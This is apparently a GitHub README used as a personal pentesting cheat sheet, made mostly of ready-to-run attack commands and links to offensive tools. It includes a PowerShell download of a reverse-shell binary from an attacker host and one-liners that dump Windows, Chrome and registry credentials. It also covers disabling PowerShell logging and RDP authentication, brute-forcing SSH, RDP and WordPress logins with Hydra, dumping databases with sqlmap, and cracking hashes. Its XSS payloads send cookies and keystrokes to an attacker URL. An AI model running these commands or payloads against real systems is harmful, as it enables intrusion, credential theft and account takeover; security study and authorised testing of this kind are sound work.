 <!-- <h1 align='center'> Penetration time</h1> -->
 <body>
	
[![Typing SVG](https://readme-typing-svg.demolab.com?font=Bitter&weight=500&size=40&pause=1000&color=3C4CFF&background=AC51FF00&width=500&height=80&lines=P3netrati0n+T1me!)](https://git.io/typing-svg)
<img src='https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExYWM2NWI0ZDIwMjA3ZWIyYWRiZmEyYzA5NTFlNThmNTFhYWI1MWE0ZiZlcD12MV9pbnRlcm5hbF9naWZzX2dpZklkJmN0PWc/3oz8xA9gtnyVDPZJHW/giphy.gif' width='250'/>

<h2 align='center'> My pentesting cheat sheet library, where I share commands, tools, websites and <p> the same things in one place during my path and increasing skills. </h2>

<h3 id='start'> There are: </h3>
<ol>
	<li> <a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/network_tools'> Network tools </a>
	<li> <a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/shells'> Web Shells </a>
	<li> <a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/scripts'> Scripts </a> 
  	<li> <a href='#n1'> Command examples </a>
  	<li> <a href='#n2'> Payloads </a>
  	<li> <a href='#n3'> Helpful sites </a>
	<li> <a href='#n4'> GitHub Tools </a>
	<li> <a href='#n5'> Browser add-ons </a>
	<li> <a href='#n6'> Privilege Escalation </a>
	<li> <a href ='https://github.com/Kode-n-Rolla/pentesting_time/blob/main/Pentest%20process.md'> Help </a> about pentest process
	<!--<li> cheat sheet injections
	<li> resume my stars 
	Add XSStrike to Tools!-->
 	<p> <h3> <ins>N.B. <-- Back link - Means return to the table of contents.</ins> </h3>

</ol>

<h2 align='center' id='n1'><em> Command Examples</em> </h2> 
	Topic contains:
	<li> Remote Desktop Protocol <a href='#n1.1'> (RDP) </a>
	<li> <a href='#n1.2'> PowerShell </a>
	<li> <a href='#n1.3'> Linux </a>
	<li> <a href='#n1.4'> Windows </a>
	<li> <a href='#n1.5'> Nmap </a> commands with search vulnerabilities script
	<li> <a href='#n1.6'>Gobuster </a> dirs enumeration command
	<li> <a href='#n1.7'> Hydra </a>
	<li> <a href='#n1.8'> Dirsearch </a>
	<li> <a href='#n1.9'> Pump </a> shell, if target system has python3
	<li> <a href='#n1.10'> SQLmap </a>
	<li> <a href='#n1.11'> John The Ripper </a>
 	<li> <a href='#n1.12'> Hashcat </a>
		
<h3 id='n1.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Remote Desktop Protocol (RDP): </ins></h3>
  <pre><code> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;'PASSWORD'> </code></pre>
  <p><pre><code> xfreerdp /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;PASSWORD> +clipboard </code></pre>
	
<h3 id='n1.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>PowerShell commands </ins></h3>
<ul>
   <li> To get stable shell from unstable from PowerShell. FILENAME.exe is the reverse shell:
  <pre><code> powershell -c "Invoke-WebRequest -Uri 'http://&lt;LOCAL_IP>:&lt;PORT>/&lt;FILENAME.exe>' -OutFile 'C:\Windows\Temp\&lt;FILENAME.exe>'" </code></pre>

  <li><p> With this command, you can identify files with potentially sensitive data such as account information, credentials, configuration files, etc. based on their filename: <pre><code>gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue</code></pre>

  <li><p> This command will look for remnants of autosets and autoconfigurations that could potentially contain plain text or base64 encoded passwords: <pre><code>gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue</code></pre>

  <li><p> With this command it is possible to find files containing a specific pattern, for example here we are looking for the "password" pattern in various text configuration files: <pre><code>gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"</code></pre>

  <li><p> Using the following PowerShell command, you can find database connection strings (with plain text credentials) stored in various configuration files such as web.config for ASP.NET configuration, Visual Studio project files, etc.: <pre><code>gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"</code></pre>

  <li><p> With this command, you can easily find configuration files belonging to a Microsoft IIS, XAMPP, Apache, PHP, or MySQL installation: <pre><code>gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue</code></pre>

  <li><p> With the following one-liner, we can retrieve all stored credentials from the credential manager using the CredentialManager PowerShell module: <pre><code>Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }</code></pre>

  <li><p> The following command retrieves saved credentials from the Google Chrome browser, if installed and if there are saved passwords: <pre><code>[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))</code></pre>

  <li><p> The following command will get the autologin credentials from the registry: <pre><code>gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"</code></pre>

  <li><p> Sometimes it can be useful to set the MAC address on a network interface, and with PowerShell we can easily do this without using third party utilities: <pre><code>Set-NetAdapter -Name "Ethernet0" -MacAddress "00-01-18-57-1B-0D"</code></pre>

  <li><p> This trio of commands can be useful when there is a goal to connect to the system using a graphical RDP session, but for some reason it is not enabled: 
  <p> Allow RDP connections - <pre><code>(Get-WmiObject -Class "Win32_TerminalServiceSetting" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)</code></pre> 
  <p> Disable NLA - <pre><code>(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)</code></pre> 
  <p> Allow RDP on the firewall - <pre><code>Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Set-NetFirewallRule -Enabled True</code></pre>

  <li><p> Here is a useful command to whitelist an IP address in Windows Firewall: <pre><code>New-NetFirewallRule -Action Allow -DisplayName "name_rule" -RemoteAddress &lt;DESIRED_IP></code></pre>
  After we are done with our cases, remove the rule: <pre><code>Remove-NetFirewallRule -DisplayName "name_rule"</code></pre>

  <li><p> With the following commands, we can disable the logging feature of PowerShell commands in the current shell session: <pre><code>Set-PSReadlineOption –HistorySaveStyle SaveNothing</code></pre> 
  <p> OR <pre><code>Remove-Module PSReadline</code></pre>

  <li><p> Here is a simple PowerShell command to query the Security Center and determine all installed antivirus products on this computer: <pre><code>Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct</code></pre>

</ul>
  
<h3 id='n1.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Linux </ins></h3>
<h4> &nbsp;&nbsp;&nbsp; Commands to find </h4>
	Find all files in / directory (-type d for find dirs):
	<p> <pre><code> find / -type f </code></pre>
	File name search:
	<p> <pre><code> find / -type f | grep '&lt;FILE_NAME>' </code></pre>
	Find all path files with ‘config’ in proc dirs:
	<p> <pre><code> find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null </code></pre>

<h3 id='n1.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Windows </ins></h3>
<h4> &nbsp;&nbsp;&nbsp; Commands to find </h4>
	This command searches for the string "password" inside all files with the extensions .xml, .ini, .txt, and .config on the current C: drive:
 	<pre><code>cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config</code></pre>
  	<ul>
		<li> cd C:\ - changes to the root directory of the C: drive
		<li> findstr - command for searching strings in files
		<li> /s - performs a search in all subdirectories
		<li> /p - skips files with non-printable characters
		<li> /i - ignores case sensitivity when searching for strings
		<li> /n - displays the line number containing the string
		<li> /m - displays only the file name if a match is found
   	</ul>
		
<h3 id='n1.5'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Nmap</ins> with vulnerse script </h3>
Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'> download </a> script files from github and install it. Thanks for that, <a href='https://github.com/vulnerscom'> Vulners Team </a>!

   Checking for a vulnerability in the software on the server:
   <p> <pre><code> Nmap -Pn &lt;TARGET_IP> --script=vulnerse.nse -p &lt;PORT(S)> </code></pre>
   Checking brute force resistance on ssh:
   <p> <pre><code> nmap --script ssh-brute -p &lt;SSH_PORT> &lt;TARGET_IP> --script-args userdb=users.lst,passdb=passwords.lst </code></pre>
   Checking brute force resistance on ftp:
   <p> <pre><code> nmap -d --script ftp-brute -p &lt;FTP_PORT> &lt;TARGET_IP> </code></pre>
   Checking mysql anonymous login:
   <p> <pre><code> nmap -sV --script=mysql-empty-password &lt;TARGET_IP> </code></pre>
   Attempts to select a pair of login/password to enter the mysql database:
   <p> <pre><code> nmap --script mysql-brute -p &lt;MYSQL_PORT> &lt;TARGET_IP> --script-args userdb=users.lst, passdb=passwords.lst </code></pre>
   Search for hidden folders and files:
   <p> <pre><code> nmap -sV -p &lt;PORT> --script http-enum &lt;TARGET_IP> </code></pre>
   <p> P.S. If CMS, research <code>&lt;name_0f_CMS_0r_DB> brute force nmap</code>
	   
<h3 id='n1.6'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Gobuster command: </ins></h3>
   <pre><code> gobuster dir -u &lt;TARGET_URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </code></pre>
		
<h3 id='n1.7'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Hydra </ins></h3>
    &nbsp;&nbsp;&nbsp; Brute force against a protocol of some choice:
   	<pre><code> hydra -P &lt;WORLIST> -v &lt;TARGET_IP> &lt;PROTOCOL> </code></pre>
   <p> &nbsp;&nbsp;&nbsp; Brute Force ssh:
	   <pre><code>hydra -L /path/to/file/user.txt -P /path/to/file/pass.txt &lt;TARGET_IP> ssh -t 4</code></pre>
   <p> &nbsp;&nbsp;&nbsp; Brute Force smb example:
	<pre><code> hydra -L ~/path/to_file/user.txt -P ~.path/to_file/pass.txt &lt;TARGET_IP> smb -V</code></pre>   
   <p> &nbsp;&nbsp;&nbsp; Can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in some lists. (-vV = verbose mode, showing login attempts):
   	<pre><code> hydra -v -V -u -L &lt;USERNAME_LIST> -P &lt;PASSWORD_LIST> -t 1 -u &lt;TARGET_IP> &lt;PROTOCOL> </code></pre>
   <p> &nbsp;&nbsp;&nbsp; Attack a Windows Remote Desktop with a password list:
   	<pre><code> hydra -t 1 -V -f -l &lt;USERNAME> -P &lt;WORDLIST> rdp://&lt;TARGET_IP> </code></pre>
   <p> &nbsp;&nbsp;&nbsp; Craft a more specific request for Hydra to brute force:
   	<pre><code> hydra -l &lt;USERNAME> -P .&lt;PASSWORD_LIST> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' </code></pre>
		
<h3 id='n1.8'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Dirsearch </ins></h3>
   Search a lot of interesting by extensions:
   <pre><code> dirsearch -e php,log,sql,txt,bak,tar,tar.gz,zip,rar,swp,gz,asp,aspx -u '&lt;TARGER_IP>' </code></pre>
		
<h3 id='n1.9'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python command to <ins>pump</ins>nc shell </h3>
   PTY is a library for pseudo-terminal functionality that is part of the Standard Python Library. There is a nc shell and get pump shell:
   <pre><code> python -c 'import pty;pty.spawn("/bin/bash")' </code></pre>

<h3 id='n1.10'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> SQLmap </ins></h3>
	&nbsp;&nbsp;&nbsp; Start SQL injection attack:
 	<pre><code>sqlmap -u "&lt;TARGET_URL>" --dbs --batch</code></pre>
  		-u - target URL
   		<p>--dbs - get db name
    		<p>--batch -default whenever user input is unavoidable
     	<p> &nbsp;&nbsp;&nbsp; When get the db name to get tables name
	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> --tables --batch</code></pre>
		-D - db name
  		<p>--tables - tables enumiration
    	<p> &nbsp;&nbsp;&nbsp; To get columns name in the table of interest
     	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> -T &lt;table_name> --columns --batch</code></pre>
		-T - selected table
  		<p>--columns - to output db columns
    	<p> &nbsp;&nbsp;&nbsp; Get data from table
     	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> -T &lt;table_name> --dump --batch</code></pre>
      		--dump - unload information from the DBMS database 
	<p> &nbsp;&nbsp;&nbsp; Will execute all the above functions at once and output all information about the database, including table names, columns, etc.
     	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> --dump-all --batch</code></pre>
      		--dump-all - unload all information from the DBMS database 

 <h3 id='n1.11'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> John The Ripper </ins></h3>
 	Firstly use hash-identifier. 
 	<p><h4> &nbsp;&nbsp;&nbsp; Cracking some type of hashes: </h4>
  		<pre><code>john --format=raw-&lt;encryption> --wordlist=path/to/wordlist.txt to_crack.txt</code></pre>
   		&lt;encryption> - md4, md5, sha1, sha256, whirlpool
    	<p><h4> &nbsp;&nbsp;&nbsp; Single Mode </h4>
		<p> There is a username and hash password (username:d776dd32d662b8efbdf853837269bd725203c579 and this line in file to-crack.txt), so use this mode to generate password variations (Username, USERNAME, UseRNAmE, and so on):
     		<pre><code>john --single --format=raw-sha1 to_crack.txt</code></pre>
     	<p><h4> &nbsp;&nbsp;&nbsp; Dictionary Mode </h4>
		<p>There is a file to_crack.txt with edba955d0ea15fdef4f61726ef97e5af507430c0, for example.
      		<p> The command to run John in dictionary mode using the wordlist:
       		<pre><code>john --wordlist=path/to/wordlist.txt --format=raw-sha1 to_crack.txt</code></pre>
	<p><h4> &nbsp;&nbsp;&nbsp; Incremental Mode </h4>
 		<p>It tries all possible character combinations as passwords. Can go on for a long time if the password is too long or a combination of alphanumeric characters and symbols:
   		<pre><code>john -i:digits passwordfile.txt</code></pre>
		<p> -i - tells John that to use the increment mode
  		<p> digits - can be used to set the maximum number of digits in the password
    	<p><h4> &nbsp;&nbsp;&nbsp; To crack LM/NTLM: </h4>
     		<pre><code>john --format=lm to_crack.txt</code></pre>
       	<p><h4> &nbsp;&nbsp;&nbsp; To crack a Linux password </h4>
	<p>The unshadow command combines the passwd (/etc/passwd) and shadow(/etc/shadow) files together into a single file. This can then be used by John to crack passwords.
		<p> The command will combine the files together and create an output.db file:
		<pre><code>unshadow /etc/passwd /etc/shadow > output.db</code></pre>
  		<p> Now crack the output.db file:
    		<pre><code>john output.db</code></pre>
      <p><h4> &nbsp;&nbsp;&nbsp; Cracking a Zip file password </h4>
      		<p> First have to get the hash of the zip file’s password. Command will get the hash from the zip file and store it in the zip.hashes file:
      		<pre><code>zip2john file.zip > zip.hashes</code></pre>
		<p> Then to crack the hash:
  		<pre><code>john zip.hashes</code></pre>
      
<h3 id='n1.12'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Hashcat </ins></h3>
	<p><h4> &nbsp;&nbsp;&nbsp; MD5 Hashes </h4>
 	<p> hash.txt > 8743b52063cd84097a65d1633f5c74f5
  	<p> Use:
   		<pre><code>hashcat -m 0 -a 0 hash.txt passwordlist.txt</code></pre>
     		<p> -m 0 - MD5 hash mode
       		<p> -a 0 - dictionary mode
	 	<p> hash.txt - txt file containing hash in a compliant format
   		<p> passwordlist.txt - dictionary file containing passwords in plain text
     <p><h4> &nbsp;&nbsp;&nbsp; Salted MD5 Hashes </h4>
     	<p> hash.txt > md5($pass.$salt):  01dfae6e5d4d90d9892622325959afbe:7050461
       		<pre><code>hashcat -m10 -a0 hash.txt passwordlist.txt</code></pre>
	 	<p> -m 10 - salted MD5 hash mode
   	<p><h4> &nbsp;&nbsp;&nbsp; MD5Crypt Digets </h4>
    	<p> hash.txt > md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) $1$28772684$iEwNOgGugqO9.bIz5sk8k/ 
     		<pre><code>hashcat -m 500 -a 0 hash.txt passwordlist.txt</code></pre>
       		<p> -m 500 - MD5Crypt Digests hash mode
	 <p><h4> &nbsp;&nbsp;&nbsp; HMAC-SHA1 key </h4>
       	 <p> hash.txt > HMAC-SHA1 (key = $pass) c898896f3f70f61bc3fb19bef222aa860e5ea717:1234
  		<pre><code>hashcat -m150 -a 0 hash.txt passwordlist.txt</code></pre>
    		<p> -m 150 - HMAC-SHA1 key hash mode
      <p><h4> &nbsp;&nbsp;&nbsp; SHA-1 Digets </h4>
      <p> hash.txt > b89eaac7e61417341b710b727768294d0e6a277b
      		<pre><code>hashcat -m100 -a 0 hash.txt passwordlist.txt</code></pre>
		<p> -m 100 - SHA1 digest hash mode
  	<p><h4> &nbsp;&nbsp;&nbsp; SHA2-384 Hash </h4>
   	<p> hash.txt > SHA2-384 07371af1ca1fca7c6941d2399f3610f1e392c56c6d73fddffe38f18c430a2817028dae1ef09ac683b62148a2c8757f42
     		<pre><code>hashcat -m 10800 -a 0 hash.txt passwordlist.txt</code></pre>
       		<p> -m 10800 - SHA-2 Digests hash mode
	 <p><h4> &nbsp;&nbsp;&nbsp; SHA3-512 Hash </h4>
  	 <p> hash.txt > SHA3–512 7c2dc1d743735d4e069f3bda85b1b7e9172033dfdd8cd599ca094ef8570f3930c3f2c0b7afc8d6152ce4eaad6057a2ff22e71934b3a3dd0fb55a7fc84a53144e
      		<pre><code>hashcat -m 17600 -a 0 hash.txt passwordlist.txt</code></pre>
		<p> -m 17600 - SHA3–512 hash mode
	<p><h4> &nbsp;&nbsp;&nbsp; NTLM Hashes </h4>
	<p> hash.txt > b4b9b02e6f09a9bd760f388b67351e2b
 		<pre><code>hashcat -m 1000 -a 0 hash.txt passwordlist.txt</code></pre>
   		<p> -m 1000 - NTLM Digests hash mode
     	<p><h4> &nbsp;&nbsp;&nbsp; CRC32 hashes </h4>
      	<p> hash.txt > c762de4a:00000000
       		<pre><code> hashcat -m 11500 -a 0 hash.txt passwordlist.txt</code></pre>
	 	<p> -m 11500 - CRC32 hash mode


<h3 align='right'><a href='#start'> <-- Back </a></h3>
   
	
<h2 align='center' id='n2'><em> Payloads </em></h2>
    <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS Payloads </h3>
    <li> <b> Proof Of Concept (PoC) </b> - <pre><code> <script>alert('Success XSS!');</script> </code></pre>
      <p> This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text "Success XSS".
    <li> <b> Session Stealing </b> - <pre><code> <script>fetch('url/steal?cookie=' + btoa(document.cookie));</script> </code></pre>
      <p> Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
    <li> <b> Key Logger </b> - <pre><code> <scripr>document.onkeypress = function(v) {fetch('url/log?key=' + btoa(v.key));}</script> </code></pre>
      <p> The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
    <li> <b> Business Logic </b> - <pre><code> <script>user.changeEmail('e@mail.com');</script> </code></pre>
      <p> This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail().
    <li> <b> Polyglots </b> - <pre><code> jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Success XSS!'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Success XSS!')//>\x3e </code></pre>
      <p> An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.

<h3 align='right'><a href='#start'> <-- Back </a></h3>
	      
        
<h2 align='center' id='n3'><em> Sites </em></h2>
      <h3> Cheat sheets </h3>
	      <li> <a href='https://devhints.io/bash'> Bash scripting </a>
	      <li> <a href='https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2'> How </a> pump nc shell
	      <li> <a href='https://www.stationx.net/nmap-cheat-sheet/'> Nmap </a>
              <li> <a href='https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993'> PowerShell </a> cheatsheets
	      <li> <a href='https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'> Reverse Shell </a> cheatsheets
      <h3> CVE and Vulnerabilities db search and help </h3>
	      <li> <a href='https://www.first.org/cvss/calculator/3.0'> CVSS </a> calculator to vulnerability assessment
	      <li> <a href='https://cve.mitre.org/'> DataBase </a> of Common Vulnerabilities and Exposures
	      <li> <a href='https://vulners.com/'> Vulnerabilities </a> database
	      <li> <a href='https://www.exploit-db.com/'> OffSec </a> exploit db
	      <li> <a href='https://vuldb.com/'> Platform </a> for control vulnerabilities and Threat analysis
      <h3> Hashes, encode/decode, cracker, identify </h3>
	      <li> <a href='https://crackstation.net/'> crackstation.net </a> - online password hash cracker
	      <li> <a href='https://www.base64encode.org/'> Base64 </a> encode/decode
	      <li> <a href='https://hashes.com/en/tools/hash_identifier'> Identify hash types </a>
	      <li> <a href='https://gchq.github.io/CyberChef/'> CyberChef </a> - encode/decode service
	      <li> <a href='https://www.kirsle.net/wizards/flask-session.cgi'> Flask Session Cookie Decoder </a>
	      <li> <a href='https://www.cs.drexel.edu/~jpopyack/IntroCS/HW/RSAWorksheet.html'> RSA </a> calculator
      <h3> Learning Path </h3>
	      <li> <a href='https://tryhackme.com/'> TryHackMe </a>
	      <li> <a href='https://www.hackthebox.com/'> HackTheBox </a>
	      <li> <a href='https://hackthissite.org/'> HackThisSite </a>
	      <li> <a href='https://ctftime.org/ctfs'> CTF </a> practice
	      <li> <a href='http://www.itsecgames.com/'> BWAPP </a> - buggy web application. Virtual pentest laboratory to practice.
	      <li> Free <a href='https://thexssrat.podia.com/ratatatata'> set </a> of practice tasks. Thanks to <a href='https://www.youtube.com/c/TheXSSrat'> TheXSSrat </a>
      <h3> MSFVenom help </h3>
	      <li> <a href='https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1'> gist.github </a>
	      <li> <a href='https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/'> Cheat Sheet </a> 
      <h3> OSINT </h3>
	      <li> <a href='https://osintframework.com/'> Aggregation </a> of all popular tools and resources for OSINT
	      <li> <a href='https://archive.org/'> Archive </a> of sites history
	      <li> <a href='https://viewdns.info/'> ViewDNS </a> Offers reverse IP Lookup.
              <li> <a href='https://www.shodan.io/'> Shodan </a> is the world's first search engine for Internet-connected devices.
	      <li> <a href='https://spark-interfax.ru/'> This </a> is a system that gathers all available information about companies and extracts data from it
              <li> <a href='https://search.censys.io/'> Censys Search </a> Can provide a lot of information about IP addresses and domains
	      <li> <a href='https://dnsdumpster.com/'> This </a> is a passive and fast search domains and subdomains and etc
	      <li> <a href='https://crt.sh/'> DataBase </a> SSL/TLS-certificates issued for domain names
      <h3> Password Services </h3>
	      <li> <a href='https://cirt.net/passwords'> CIRT.net </a> Default Passwords service
	      <li> <a href='https://default-password.info/'> Default-Password.info </a> Default Passwords service
	      <li> <a href='https://datarecovery.com/rd/default-passwords/'> Datarecovery.com </a> Default Passwords service
	      <li> <a href='https://wiki.skullsecurity.org/index.php?title=Passwords'> This </a> wiki page includes the most well-known collections of passwords.

<h3 align='right'><a href='#start'> <-- Back </a></h3>
       
        
<h2 align='center' id='n4'><em> GitHub Tools </em></h2>
<ol>
	<li><a href='#n4.1'> BruteForce & Wordlists </a>
	<li><a href='#n4.2'> Enumiration </a>
	<li><a href='#n4.3'> OSINT </a>
	<li><a href='#n4.4'> Payloads </a>
	<li><a href='#n4.5'> Privilege Escalation </a>
	<li><a href='#n4.6'> Social Engineering </a>
	<li><a href='#n4.7'> Another </a>
</ol>
	<ol>
		<h3 id='n4.1'><li>BruteForce and Wordlists </h3>
			<ul>
				<li><a href='https://github.com/Cryilllic/Active-Directory-Wordlists'> Active Directory </a> Wordlists contains User.txt and Pass.txt
				<li><a href='https://github.com/duyet/bruteforce-database'> BruteForce </a> Database
				<li><a href='https://github.com/empty-jack/YAWR'> YAWR</a>. Yet Another Wordlists Repo. Contains OS,RECON,WEB,brute folders
				<li><a href='https://www.kali.org/tools/crunch/'> Crunch </a>
		   			<p> This is one of many powerful tools for creating an offline wordlist. With crunch, you can specify numerous options, including min, max, and options. The following example creates a wordlist containing all possible combinations of 3 characters, including 1-5 and qwerty. You can use the -o argument to save. <p>Example: <pre><code> crunch 3 3 12345qwerty -o cranch.txt </code></pre>
				<li> Top wordlists by <a href='https://github.com/danielmiessler/SecLists'> DanielMiessler </a>
				<li><a href='https://github.com/blark/aiodnsbrute'> DNS </a> asynchronous bruteforce
 				<li><a href='https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master'> Tool </a> for hash identification. 
					<p> Python file. Powerful. User friendly interface.
				<li><a href='https://github.com/ropnop/kerbrute'> Kerberos </a> bruteforcing
				<li><a href='https://github.com/therodri2/username_generator'> Username generator </a>
					<p> Could help create a list with most of the possible combinations if we have a first name and last name. Use git clone and 					<p> <pre><code> python3 username_generator.py -h </code></pre> shows the tool's help message and optional arguments.
				<li><a href='https://github.com/kkrypt0nn/wordlists'> Wordlists </a> by kkrypt0nn. A collection of wordlists for many different usages
    			</ul>
		<h3 id='n4.2'><li> Enumiration </h3>
			<ul>
				<li><a href='https://github.com/ly4k/Certipy'> Crtipy</a>. Tool for Active Directory Certificate Services enumeration and abuse
				<li><a href='https://github.com/ffuf/ffuf'> Fuzzer </a>
				<li><a href='https://github.com/diego-treitos/linux-smart-enumeration'> Linux </a> smart enumiration
				<li><a href='https://github.com/aboul3la/Sublist3r'> Sublist3r</a>. Subdomains enumiration python tool
			</ul>
		<h3 id='n4.3'><li> OSINT </h3>
			<ul>
				<li><a href='https://github.com/IvanGlinkin/Fast-Google-Dorks-Scan'> Fast Google Dorks Scan </a>
				<li><a href='https://github.com/khast3x/h8mail'> h8mail </a> is an email OSINT and breach hunting tool
				<li><a href='https://github.com/laramies/theHarvester'> theHarvester</a>. E-mails, subdomains and names Harvester 
			</ul>
		<h3 id='n4.4'><li> Payloads </h3>
			<ul>
				<li><a href='https://github.com/swisskyrepo/PayloadsAllTheThings'> All </a> kind of payloads and bypasses
				<li><a href='https://github.com/payloadbox/command-injection-payload-list'> Payloads </a> for Unix and Windows OS
				<li><a href='https://github.com/capture0x/XSS-LOADER'> XSS-LOADER</a>. All in one tools for XSS PAYLOAD GENERATOR -XSS SCANNER-XSS DORK FINDER
				<li><a href='https://github.com/payloadbox/xss-payload-list'> XSS </a> payloads
   </ul>
		<h3 id='n4.5'><li> Privilege Escalation </h3>
			<ul>
				<li><a href='https://github.com/carlospolop/PEASS-ng'> Privilege Escalation </a> (LinPEAS & WinPEAS)
				<li><a href='https://github.com/luke-goddard/enumy'> Enumy</a>. Linux post exploitation privilege escalation enumeration
				<li><a href='https://github.com/linted/linuxprivchecker'> Linux </a> PrivEsc Check Script
				<li><a href='https://github.com/The-Z-Labs/linux-exploit-suggester'> Linux PrivEsc </a>
				<li><a href='https://github.com/gentilkiwi/mimikatz'> Mimikatz</a>. Windows PrivEsc
				<li><a href='https://github.com/mostaphabahadou/postenum'> Postenum </a> is a Linux enumeration and privilege escalation tool
				<li><a href='https://github.com/antonioCoco/RogueWinRM'> RougeWinRM</a>. Win PrivEsc
			</ul>
		<h3 id='n4.6'><li> Social Engineering </h3>
			<ul>
				<li><a href='https://github.com/giuliacassara/awesome-social-engineering'> Awesome </a> social engineering resources
				<li><a href='https://github.com/trustedsec/social-engineer-toolkit'> SET</a>. Social Engineer Toolkit
    			</ul>
		<h3 id='n4.7'><li> Another </h3>
			<ul>
				<li><a href='https://github.com/wapiti-scanner/wapiti'> Wapiti</a>. Web vulnerability scanner
				<li><a href='https://github.com/Bearer/bearer'> Bearer</a>. Scans source code against top security and privacy risks
				<li><a href='https://github.com/Porchetta-Industries/CrackMapExec'> CrackMapExec</a>. A swiss army knife for pentesting networks
				<li><a href='https://github.com/BloodHoundAD/BloodHound'> BloodHound</a>. Six Degrees of Domain Admin
				<li><a href='https://github.com/digininja/CeWL'> Cewl </a> can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below:
					<pre><code> cewl -w list.txt -d 5 -m 5 http://target_site.com </code></pre>
					<p> -w will write the contents to a file, here is list.txt.
					<p> -m 5 gathers strings (words) that are 5 characters or more
					<p> -d 5 is the depth level of web crawling/spidering (default 2)
					<p> http://target_site.com is the URL that will be used
					<p> As a result, now have a decently sized wordlist based on relevant words for the specific enterprise, like names, locations, and a lot of their business lingo. Similarly, the wordlist that was created could be used to fuzz for usernames. 
				<li><a href='https://www.kali.org/tools/ncurses-hexedit/'> Hexeditor </a>
	        			<p> Tools for change files signature. <a href='https://en.wikipedia.org/wiki/List_of_file_signatures'> Link </a> to Wiki with List of file signatures. 
				<li><a href='https://github.com/CISOfy/lynis'> Lynis</a>. Check Linux security
				<li><a href='https://github.com/DominicBreuker/pspy'> Pspy</a>. Great for enumeration of Linux systems in CTFs and more.
